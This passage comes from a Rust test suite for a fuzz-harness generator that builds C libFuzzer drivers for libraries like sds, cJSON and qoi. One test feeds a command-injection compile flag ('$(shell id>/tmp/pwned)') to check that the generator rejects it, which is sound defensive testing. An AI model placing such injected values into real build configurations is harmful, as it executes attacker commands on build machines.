        fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn cfunction(name: &str) -> CFunction {
        CFunction {
            name: name.to_owned(),
            line: 1,
            return_type: String::new(),
            params: Vec::new(),
            ..Default::default()
        }
    }

    #[test]
    fn variadic_format_param_uses_neutralised_decoder() {
        // A custom variadic logger whose format param is NOT named fmt/format
        // (`void my_log(int level, const char *message, ...)`). The last fixed
        // `char *` before the `...` is the printf format; it must be decoded with
        // gf_c_format_string (which strips `%`), NOT gf_c_string — the harness
        // passes no matching varargs, so a fuzzed `%s` would crash vfprintf (a
        // harness format/argument mismatch FALSE POSITIVE).
        let out = temp_dir("vararg_fmt");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-VARFMT".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/mylog.c"),
            target: CFunction {
                variadic: true,
                ..cfunction("my_log")
            },
            params: vec![
                CParameter {
                    name: "level".to_owned(),
                    c_type: "int".to_owned(),
                },
                CParameter {
                    name: "message".to_owned(),
                    c_type: "const char *".to_owned(),
                },
            ],
            return_type: "void".to_owned(),
            target_includes: vec!["mylog.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/mylog.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("char *message = gf_c_format_string(&Cur, 4096)"),
            "the variadic format param must be %-neutralised: {main}"
        );
    }

    #[test]
    fn file_loader_path_param_is_driven_via_tempfile() {
        // Campaign #25: pugixml-style `load_file(const char *path_)` — a bare
        // `path`/`path_` param to a file-LOADER is a filesystem path, not an in-band
        // string. Decoded as a random gf_c_string it ENOENTs and the parser never
        // runs (hollow false-clean). Route it through the tempfile content decoder so
        // the file's CONTENT is the fuzz input.
        let out = temp_dir("loadfile_path");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-LOADFILE".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/doc.c"),
            target: cfunction("doc_load_file"),
            params: vec![CParameter {
                name: "path_".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["doc.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/doc.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("gf_make_tempfile") || main.contains("_gf_tmp"),
            "a file-loader path param must be driven via a tempfile, not gf_c_string: {main}"
        );
        assert!(
            !main.contains("path_ = gf_c_string"),
            "the path must NOT be a random in-band string: {main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn integer_index_out_pointer_with_byte_buffer_is_pinned_zero() {
        // Campaign #9: qoi_read_32(const unsigned char *bytes, int *p) — `bytes` is a
        // lone byte buffer and `p` is an in/out index the callee walks
        // (`bytes[(*p)++]`). Fuzzing `*p` full-range against the Size-bounded buffer
        // is a guaranteed heap-OOB on short/0-byte input. The index storage must be
        // pinned to 0 (the caller's seed), not a fuzzed value.
        let out = temp_dir("idx_ptr");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-IDX".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/qoi.c"),
            target: cfunction("qoi_read_32"),
            params: vec![
                CParameter {
                    name: "bytes".to_owned(),
                    c_type: "const unsigned char *".to_owned(),
                },
                CParameter {
                    name: "p".to_owned(),
                    c_type: "int *".to_owned(),
                },
            ],
            return_type: "unsigned int".to_owned(),
            target_includes: vec!["qoi.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/qoi.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("int _gf_out_p = (int)0;"),
            "the index out-pointer must be pinned to 0: {main}"
        );
        assert!(
            !main.contains("gf_i32(&Cur)") || !main.contains("_gf_out_p = (int)gf_i32"),
            "the index out-pointer must NOT be fuzzed full-range: {main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn builder_returning_its_handle_frees_return_not_consumed_param() {
        // Campaign #10: a C builder that RETURNS the same handle type it takes (sds
        // `sds sdscatlen(sds s, const void *t, size_t len)` reallocs `s` and returns
        // the NEW live pointer). Freeing the stale `s` param after the realloc is a
        // UAF/double-free. The harness must free the RETURN value via the known
        // destructor and SUPPRESS the consumed param's free.
        let out = temp_dir("sds_builder");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "sds".to_owned(),
                init: Some("sdsempty".to_owned()),
                delete: Some("sdsfree".to_owned()),
                init_returns_handle: true,
                init_args: Vec::new(),
            }],
            drive_plan: None,
            harness_id: "H-SDS".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/sds.c"),
            target: cfunction("sdscatlen"),
            params: vec![
                CParameter {
                    name: "s".to_owned(),
                    c_type: "sds".to_owned(),
                },
                CParameter {
                    name: "t".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "sds".to_owned(),
            target_includes: vec!["sds.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/sds.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        // The handle is constructed via its returning constructor.
        assert!(main.contains("sds s = sdsempty()"), "{main}");
        // The return value is captured and freed via the known destructor.
        assert!(main.contains("sds R = "), "return must be captured: {main}");
        assert!(
            main.contains("if (R) sdsfree(R)"),
            "the live return value must be freed: {main}"
        );
        // The consumed (possibly-realloc'd) param free must be SUPPRESSED.
        assert!(
            !main.contains("sdsfree(s)"),
            "the stale param free must be suppressed (UAF/double-free): {main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn constructor_returning_handle_frees_return_value() {
        // redis `sdsnewlen(const void *, size_t) -> sds` returns a fresh handle
        // with a known lifecycle destructor. Even though it does not consume an
        // existing sds param, dropping R leaks on every successful input.
        let out = temp_dir("sds_ctor_return");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "sds".to_owned(),
                init: Some("sdsempty".to_owned()),
                delete: Some("sdsfree".to_owned()),
                init_returns_handle: true,
                init_args: Vec::new(),
            }],
            drive_plan: None,
            harness_id: "H-SDS-CTOR".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/sds.c"),
            target: cfunction("sdsnewlen"),
            params: vec![
                CParameter {
                    name: "init".to_owned(),
                    c_type: "const void *".to_owned(),
                },
                CParameter {
                    name: "initlen".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ],
            return_type: "sds".to_owned(),
            target_includes: vec!["sds.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/sds.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(main.contains("sds R = "), "return must be captured: {main}");
        assert!(
            main.contains("if (R) sdsfree(R)"),
            "constructor return must be released via lifecycle destructor: {main}"
        );
        let _ = fs::remove_dir_all(&out);
    }

    #[test]
    fn incomplete_by_value_result_type_is_skipped_cleanly() {
        // §26.4: a target returning a FORWARD-declared (incomplete) struct BY VALUE
        // (stb `stb_cfg` -> `struct stb_cfg_st`) cannot be harnessed — the result
        // capture `<IncompleteType> R = ...;` is rejected by the compiler. The
        // generator must skip it with a precise UnsupportedParamType reason instead
        // of emitting an uncompilable harness.
        let out = temp_dir("incomplete_ret");
        let type_defs = vec![c_parser::CTypeDefs {
            structs: vec![c_parser::CStructDef {
                name: "stb_cfg_st".to_owned(),
                fields: Vec::new(),
                line: 1,
                complete: false,
            }],
            enums: Vec::new(),
            typedefs: vec![c_parser::CTypedefDef {
                name: "stb_cfg".to_owned(),
                line: 2,
                underlying: "struct stb_cfg_st".to_owned(),
            }],
        }];
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-INCRET".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/stb.c"),
            target: CFunction {
                return_type: "stb_cfg".to_owned(),
                ..cfunction("stb_make_cfg")
            },
            params: vec![CParameter {
                name: "data".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "stb_cfg".to_owned(),
            target_includes: vec!["stb.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/stb.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs,
            result_cleanup: None,
        };
        let err = generate_c_direct_harness(args).expect_err("incomplete result must be skipped");
        let msg = err.to_string();
        assert!(
            msg.contains("incomplete type") && msg.contains("struct stb_cfg_st"),
            "skip reason must name the incomplete result type: {msg}"
        );
    }

    #[test]
    fn pointer_to_incomplete_result_type_still_builds() {
        // The guard must NOT skip a target returning a POINTER to an incomplete
        // type (stb's typical `stb_cfg *stb_new_cfg(...)`) — a pointer to an
        // incomplete type is a legal local declaration.
        let out = temp_dir("incomplete_ret_ptr");
        let type_defs = vec![c_parser::CTypeDefs {
            structs: vec![c_parser::CStructDef {
                name: "stb_cfg_st".to_owned(),
                fields: Vec::new(),
                line: 1,
                complete: false,
            }],
            enums: Vec::new(),
            typedefs: vec![c_parser::CTypedefDef {
                name: "stb_cfg".to_owned(),
                line: 2,
                underlying: "struct stb_cfg_st".to_owned(),
            }],
        }];
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-INCRETPTR".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/stb.c"),
            target: CFunction {
                return_type: "stb_cfg *".to_owned(),
                ..cfunction("stb_new_cfg")
            },
            params: vec![CParameter {
                name: "data".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "stb_cfg *".to_owned(),
            target_includes: vec!["stb.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/stb.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs,
            result_cleanup: None,
        };
        generate_c_direct_harness(args).expect("pointer-to-incomplete result must still harness");
    }

    #[test]
    fn non_variadic_trailing_string_stays_plain() {
        // A fixed-arity function's trailing `const char *name` is an ordinary
        // string and must keep the plain gf_c_string decoder (no over-trigger of
        // the variadic-format heuristic).
        let out = temp_dir("plain_str");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-PLAIN".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/p.c"),
            target: cfunction("greet"),
            params: vec![CParameter {
                name: "name".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "void".to_owned(),
            target_includes: vec!["p.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/p.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        assert!(
            main.contains("char *name = gf_c_string(&Cur, 4096)"),
            "an ordinary trailing string must stay on gf_c_string: {main}"
        );
        assert!(
            !main.contains("gf_c_format_string"),
            "must not neutralise a non-variadic ordinary string: {main}"
        );
    }

    #[test]
    fn char_double_pointer_with_count_allocates_a_string_array() {
        // cJSON_CreateStringArray(const char *const *strings, int count): the array
        // and count must agree — allocate `count` strings, not one cursor + an
        // independently-fuzzed count (which over-reads strings[1..count]).
        let out = temp_dir("strarr");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-STRARR".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/cJSON.c"),
            target: cfunction("cJSON_CreateStringArray"),
            params: vec![
                CParameter {
                    name: "strings".to_owned(),
                    c_type: "const char *const *".to_owned(),
                },
                CParameter {
                    name: "count".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "void *".to_owned(),
            target_includes: vec!["cJSON.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/cJSON.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        // The array is allocated to `count` decoded strings; count mirrors that N.
        assert!(
            main.contains("const char **strings = (const char **)calloc(_gf_n_strings"),
            "{main}"
        );
        assert!(
            main.contains("strings[_gf_i_strings] = gf_c_string(&Cur, 256)"),
            "{main}"
        );
        assert!(
            main.contains("int count = (int)_gf_count_strings"),
            "{main}"
        );
        // The strings and the array are freed.
        assert!(
            main.contains("free((void *)strings[_gf_i_strings])"),
            "{main}"
        );
    }

    #[test]
    fn plural_file_paths_use_one_real_null_terminated_tempfile_vector() {
        for (name, c_type, expected_storage) in [
            (
                "filenames",
                "const char **",
                "const char *_gf_paths_filenames[2]",
            ),
            (
                "wfilenames",
                "const wchar_t **",
                "const wchar_t *_gf_paths_wfilenames[2]",
            ),
        ] {
            let params = vec![
                CParameter {
                    name: name.to_owned(),
                    c_type: c_type.to_owned(),
                },
                CParameter {
                    name: "block_size".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ];
            let emissions = build_param_decoders(
                &params,
                &TypeRegistry::default(),
                &[],
                None,
                false,
                false,
                DecoderLimits::default(),
                "archive_read_open_filenames",
                false,
            )
            .unwrap();
            assert_eq!(emissions.len(), 2);
            assert!(
                emissions[0].decl.contains("gf_make_tempfile(Data, Size")
                    && emissions[0].decl.contains(expected_storage)
                    && emissions[0].decl.contains("NULL"),
                "plural file input must be a fuzz-backed, NULL-terminated path vector: {}",
                emissions[0].decl
            );
            assert!(
                emissions[0]
                    .free
                    .as_deref()
                    .is_some_and(|free| free.contains("unlink")),
                "temp file must be removed"
            );
            assert!(
                emissions[1].decl.contains("block_size")
                    && emissions[1].decl.contains("10240")
                    && !emissions[1].decl.contains("_gf_count")
                    && !emissions[1].decl.contains("_gf_n_filenames"),
                "block_size is a stable read chunk size, not fuzz data or the number of filenames: {}",
                emissions[1].decl
            );
        }
    }

    #[test]
    fn const_input_buffer_is_nul_terminated_only_with_a_nullterm_mode_enum() {
        // #468: utf8proc_map(const u8 *str, ssize_t strlen, ..., utf8proc_option_t
        // options) has a UTF8PROC_NULLTERM option that makes the callee IGNORE
        // strlen and read until a NUL. The raw libFuzzer `Data` span isn't
        // NUL-terminated, so that over-reads. When such a NULLTERM-mode enum is a
        // parameter, the const input buffer must be a NUL-terminated COPY.
        let defs = c_parser::parse_c_type_defs("typedef enum { OPT_NULLTERM, OPT_STABLE } opt_t;")
            .unwrap();
        let mk = |with_enum: bool| {
            let mut params = vec![
                CParameter {
                    name: "str".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "len".to_owned(),
                    c_type: "size_t".to_owned(),
                },
            ];
            if with_enum {
                params.push(CParameter {
                    name: "options".to_owned(),
                    c_type: "opt_t".to_owned(),
                });
            }
            GenerateCDirectArgs {
                decoder_limits: Default::default(),
                force: false,
                lifecycle: Vec::new(),
                drive_plan: None,
                harness_id: "H-NT".to_owned(),
                output_dir: temp_dir("nullterm"),
                source_path: PathBuf::from("/tmp/u.c"),
                target: cfunction("u_map"),
                params,
                return_type: "int".to_owned(),
                target_includes: vec!["u.h".to_owned()],
                target_includes_dirs: vec![PathBuf::from("/tmp")],
                target_sources: vec![PathBuf::from("/tmp/u.c")],
                compile_flags: Vec::new(),
                target_declared_in_header: false,
                c_runtime_include: PathBuf::from("/tmp/c_runtime"),
                type_defs: vec![defs.clone()],
                result_cleanup: None,
            }
        };

        // With the NULLTERM-mode enum: NUL-terminated copy, never raw `(...)Data`.
        let with = generate_c_direct_harness(mk(true)).unwrap();
        let m = fs::read_to_string(&with.main_c).unwrap();
        assert!(
            m.contains("char *_gf_ntbuf_str = (char *)malloc(_gf_ntlen_str + 1)")
                && m.contains("_gf_ntbuf_str[_gf_ntlen_str] = 0")
                && m.contains("len = (size_t)(_gf_ntbuf_str ? _gf_ntlen_str : 0)"),
            "NULLTERM-mode enum present -> NUL-terminated copy: {m}"
        );
        assert!(
            !m.contains("const char * str = (const char *)Data"),
            "must NOT use the zero-copy raw span when a NULLTERM mode exists: {m}"
        );

        // Without it (no NULLTERM-mode enum): keep the zero-copy, ASan-redzone-
        // backed raw span so real over-reads past the length are still caught.
        let without = generate_c_direct_harness(mk(false)).unwrap();
        let m2 = fs::read_to_string(&without.main_c).unwrap();
        assert!(
            m2.contains("const char * str = (const char *)Data"),
            "no NULLTERM mode -> zero-copy raw Data preserved (no regression): {m2}"
        );
        assert!(
            !m2.contains("_gf_ntbuf_str"),
            "must NOT NUL-terminate an ordinary length-delimited buffer: {m2}"
        );
    }

    #[test]
    fn whole_tu_source_include_renames_its_main() {
        // A target reached by #include'ing its whole .c TU (to call a static fn):
        // if that TU has its own `int main` (tinyexpr repl.c), the harness driver's
        // `main` collides ("redefinition of 'main'"). The source include must be
        // wrapped so the TU's `main` is renamed; a plain .h include is not.
        let out = temp_dir("tu-main");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-TU".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/repl.c"),
            target: cfunction("eval"),
            params: vec![CParameter {
                name: "expr".to_owned(),
                c_type: "const char *".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["repl.c".to_owned(), "tinyexpr.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/repl.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let result = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&result.main_c).unwrap();
        // The .c whole-TU include is wrapped so its `main` is renamed.
        assert!(
            main.contains("#define main govfuzz_included_main_")
                && main.contains("#include \"repl.c\"")
                && main.contains("#undef main"),
            "source TU include must rename its main:\n{main}"
        );
        // After the whole-TU include, the standard allocator names are restored so a
        // project's macro-poison (tomlc99's `#define free(x) error`) can't break the
        // harness's own free/malloc below.
        assert!(
            main.contains("#undef free") && main.contains("#undef malloc"),
            "whole-TU include must restore the standard allocators:\n{main}"
        );
        // The .h include is NOT wrapped.
        assert!(main.contains("#include \"tinyexpr.h\""), "{main}");
        let define_idx = main.find("#define main govfuzz_included_main_").unwrap();
        let h_idx = main.find("#include \"tinyexpr.h\"").unwrap();
        // The .h include line itself is a plain `#include` (no define right before it
        // on its own line) — sanity that the wrapper is specific to the .c include.
        assert!(define_idx < main.find("#include \"repl.c\"").unwrap());
        let _ = h_idx;
    }

    #[test]
    fn rejects_command_injection_in_compile_flags() {
        let out = temp_dir("inject-flag");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: None,
            harness_id: "H-C001".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/source.c"),
            target: cfunction("parse"),
            params: vec![CParameter {
                name: "n".to_owned(),
                c_type: "int".to_owned(),
            }],
            return_type: "int".to_owned(),
            target_includes: vec!["target.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/source.c")],
            // Hostile -D define from an untrusted compile_commands.json.
            compile_flags: vec!["-DX=y$(shell id>/tmp/pwned)".to_owned()],
            target_declared_in_header: false,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: Vec::new(),
            result_cleanup: None,
        };
        let err = generate_c_direct_harness(args).unwrap_err();
        assert!(
            matches!(err, HarnessGenError::UnsafeBuildInput(_)),
            "expected UnsafeBuildInput, got {err:?}"
        );
        assert!(
            !out.join("Makefile").exists(),
            "no Makefile should be written when an input is refused"
        );
    }

    #[test]
    fn sequence_orphan_length_param_is_bounded_to_the_handle_size() {
        // #468: in a sequence harness the lifecycle handle is param 0 (passed as
        // `&_gf_handle`, a single element) and excluded from the step's decoded
        // params. A `strlen`-style length DESCRIBING that handle is then the first
        // decoded param with no preceding buffer, so build_param_decoders would
        // decode it as an arbitrary `gf_i64` — and `op(&_gf_handle, strlen, ...)`
        // reads `strlen` bytes out of a 1-element handle (utf8proc_decompose) -> a
        // spurious heap-buffer-overflow. Bound that leading length to the handle's
        // own byte size; a smaller-than-buffer length is always sound.
        let defs = c_parser::parse_c_type_defs("typedef long ssize_t;").unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        let step = CLifecycleStep {
            name: "utf8proc_decompose".to_owned(),
            // handle (str) already dropped by c_lifecycle_function_to_step's skip(1)
            params: vec![
                CParameter {
                    name: "strlen".to_owned(),
                    c_type: "ssize_t".to_owned(),
                },
                CParameter {
                    name: "options".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "ssize_t".to_owned(),
            role: CStepRole::Operation,
        };
        let emission = build_c_sequence_step_emission(
            &step,
            "_gf_step0",
            "_gf_step0_result",
            &registry,
            DecoderLimits::default(),
            false,
        )
        .expect("emission");
        let strlen_decl = &emission.params[0].decl;
        assert!(
            strlen_decl.contains("gf_bounded_length(&Cur, 0, sizeof _gf_handle)"),
            "orphan length must be bounded to the handle size, got: {strlen_decl}"
        );
        assert!(
            !strlen_decl.contains("gf_i64(&Cur)"),
            "orphan length must NOT be an unbounded gf_i64: {strlen_decl}"
        );
    }

    #[test]
    fn sequence_leading_non_length_param_is_not_bounded() {
        // Guard: a normal leading scalar (not a length name) keeps its standalone
        // decoder — the #468 bounding must fire ONLY for handle-describing lengths.
        let defs = c_parser::parse_c_type_defs("typedef int dummy_t;").unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        let step = CLifecycleStep {
            name: "session_step".to_owned(),
            params: vec![CParameter {
                name: "delta".to_owned(),
                c_type: "int".to_owned(),
            }],
            return_type: "int".to_owned(),
            role: CStepRole::Operation,
        };
        let emission = build_c_sequence_step_emission(
            &step,
            "_gf_step0",
            "_gf_step0_result",
            &registry,
            DecoderLimits::default(),
            false,
        )
        .expect("emission");
        assert!(
            !emission.params[0].decl.contains("sizeof _gf_handle"),
            "non-length leading param must not be handle-bounded: {}",
            emission.params[0].decl
        );
    }

    #[test]
    fn out_param_struct_scratch_zero_inits_nonconst_struct_pointer() {
        let defs = c_parser::parse_c_type_defs("typedef struct { int a; int b; } wav_t;").unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        // Non-const pointer to a concrete struct: a parser's output -> zeroed
        // scratch passed by address, consuming no fuzz cursor.
        let e = out_param_struct_scratch("wav_t *", "pWav", &registry, &[]).expect("scratch");
        assert!(e.decl.contains("wav_t _gf_out_pWav;"), "{}", e.decl);
        assert!(
            e.decl
                .contains("memset(&_gf_out_pWav, 0, sizeof _gf_out_pWav)"),
            "{}",
            e.decl
        );
        assert_eq!(e.arg, "&_gf_out_pWav");
        // A const pointee is a genuine input the callee reads -> never zeroed.
        assert!(out_param_struct_scratch("const wav_t *", "in", &registry, &[]).is_none());
        // Scalars and unresolvable/opaque pointees are not stack-declarable structs.
        assert!(out_param_struct_scratch("int *", "n", &registry, &[]).is_none());
        assert!(out_param_struct_scratch("unknown_t *", "x", &registry, &[]).is_none());
    }

    #[test]
    fn out_param_struct_scratch_uses_visible_inplace_lifecycle() {
        let defs = c_parser::parse_c_type_defs(
            "typedef struct { void *zone; int value; } msgpack_unpacked;",
        )
        .unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        let lifecycle = vec![CHandleLifecycle {
            handle_type: "msgpack_unpacked".to_owned(),
            init: Some("msgpack_unpacked_init".to_owned()),
            delete: Some("msgpack_unpacked_destroy".to_owned()),
            init_returns_handle: false,
            init_args: Vec::new(),
        }];
        let emission =
            out_param_struct_scratch("msgpack_unpacked *", "result", &registry, &lifecycle)
                .expect("lifecycle-backed output scratch");
        assert!(
            emission
                .decl
                .contains("msgpack_unpacked_init(&_gf_out_result)"),
            "{}",
            emission.decl
        );
        assert_eq!(
            emission.free.as_deref(),
            Some("msgpack_unpacked_destroy(&_gf_out_result)")
        );
    }

    #[test]
    fn status_constructed_output_uses_delete_only_lifecycle_after_success() {
        let out = temp_dir("status-output-cleanup");
        let defs =
            c_parser::parse_c_type_defs("typedef struct { void *code; int flags; } regex_t;")
                .unwrap();
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: vec![CHandleLifecycle {
                handle_type: "regex_t".to_owned(),
                init: None,
                delete: Some("regfree".to_owned()),
                init_returns_handle: false,
                init_args: Vec::new(),
            }],
            drive_plan: None,
            harness_id: "H-REGCOMP".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/regex.c"),
            target: cfunction("regcomp"),
            params: vec![
                CParameter {
                    name: "preg".to_owned(),
                    c_type: "regex_t *".to_owned(),
                },
                CParameter {
                    name: "pattern".to_owned(),
                    c_type: "const char *".to_owned(),
                },
                CParameter {
                    name: "cflags".to_owned(),
                    c_type: "int".to_owned(),
                },
            ],
            return_type: "int".to_owned(),
            target_includes: vec!["regex.h".to_owned()],
            target_includes_dirs: vec![PathBuf::from("/tmp")],
            target_sources: vec![PathBuf::from("/tmp/regex.c")],
            compile_flags: Vec::new(),
            target_declared_in_header: true,
            c_runtime_include: PathBuf::from("/tmp/c_runtime"),
            type_defs: vec![defs],
            result_cleanup: None,
        };
        let generated = generate_c_direct_harness(args).unwrap();
        let main = fs::read_to_string(&generated.main_c).unwrap();
        assert!(
            main.contains("if (R == 0) regfree(&_gf_out_preg)"),
            "{main}"
        );
        let _ = fs::remove_dir_all(out);
    }

    #[test]
    fn struct_scratch_rejects_callback_structs_with_fn_pointer_fields() {
        // Campaign fix: a callback/vtable struct (libcbor cbor_callbacks) must NOT
        // be zero-memset as scratch — NULL fn pointers cause a self-inflicted
        // NULL-deref FP. Both scratch paths must decline so the struct-field
        // decoder (with no-op trampolines) handles it instead.
        let defs = c_parser::parse_c_type_defs(
            "typedef struct { void (*on_int)(void *, int); void (*on_str)(void *, const char *); int flags; } cbor_callbacks;",
        )
        .unwrap();
        let registry = TypeRegistry::from_defs([&defs]);
        assert!(
            out_param_struct_scratch("cbor_callbacks *", "cb", &registry, &[]).is_none(),
            "out-param scratch must decline a fn-pointer-bearing struct"
        );
        assert!(
            parser_config_struct_scratch("const cbor_callbacks *", "cb", &registry).is_none(),
            "config scratch must decline a fn-pointer-bearing struct"
        );
        // A plain POD struct is still accepted as scratch.
        let pod = c_parser::parse_c_type_defs("typedef struct { int a; int b; } pod_t;").unwrap();
        let reg2 = TypeRegistry::from_defs([&pod]);
        assert!(out_param_struct_scratch("pod_t *", "o", &reg2, &[]).is_some());
    }

    #[test]
    fn constructor_drive_loop_pumps_handle_and_folds_destroy() {
        // A constructor returning an opaque handle (`plm_t *`) must, after
        // building the handle, pump the decode siblings so the deep decoder is
        // exercised, then destroy — all under one `if (R)` guard.
        let out = temp_dir("drive");
        let args = GenerateCDirectArgs {
            decoder_limits: Default::default(),
            force: false,
            lifecycle: Vec::new(),
            drive_plan: Some(CDrivePlan {
                steps: vec![
                    CDriveStep {
                        name: "plm_decode_video".to_owned(),
                        breaks_on_null: true,
                    },
                    CDriveStep {
                        name: "plm_pump_void".to_owned(),
                        breaks_on_null: false,
                    },
                ],
                destroy: Some("plm_destroy".to_owned()),
            }),
            harness_id: "H-DRV".to_owned(),
            output_dir: out.clone(),
            source_path: PathBuf::from("/tmp/plm.c"),
            target: cfunction("plm_create_with_memory"),
            params: vec![
                CParameter {
                    name: "bytes".to_owned(),
